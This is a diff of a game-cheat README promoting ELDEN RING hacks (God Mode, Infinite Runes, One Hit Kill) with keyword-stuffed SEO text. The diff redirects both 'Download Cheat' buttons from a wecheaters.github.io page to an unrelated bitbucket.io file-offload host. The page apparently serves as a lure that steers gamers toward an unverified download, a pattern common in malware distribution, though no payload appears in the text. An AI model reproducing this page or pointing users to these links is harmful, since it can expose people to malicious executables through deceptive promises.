@@ -2,7 +2,7 @@
 
 **Frustrated by Malenia’s second phase? Getting farmed by tree spirits or dying to gravity for the 50th time? The ultimate ELDEN RING cheat setup gives you God Mode, Infinite Runes, One Hit Kill, and way more — no more suffering, just domination.**
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/elden-ring/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload8.bitbucket.io)
 ---
 
 ## 🧠 What Is an ELDEN RING Cheat?
@@ -16,7 +16,7 @@ Perfect for:
 * Speedrunning
 * Replaying NG++ without the pain
 
-[![Download Cheat](https://i.ytimg.com/vi/KdhKCGtOit4/maxresdefault.jpg)](https://wecheaters.github.io/cheats/elden-ring/)
+[![Download Cheat](https://i.ytimg.com/vi/KdhKCGtOit4/maxresdefault.jpg)](https://fileoffload8.bitbucket.io)
 ---
 
 ## 🔥 Most Popular ELDEN RING Cheats
@@ -100,3 +100,4 @@ Here’s what top-tier ELDEN RING cheats can unlock:
 elden ring cheat, god mode elden ring, infinite runes cheat, elden ring cheat tool, one hit kill elden ring, max stats hack, elden ring item spawner, fp stamina cheat, elden ring no cooldowns, elden ring trainer vs cheat
 
 ---
+
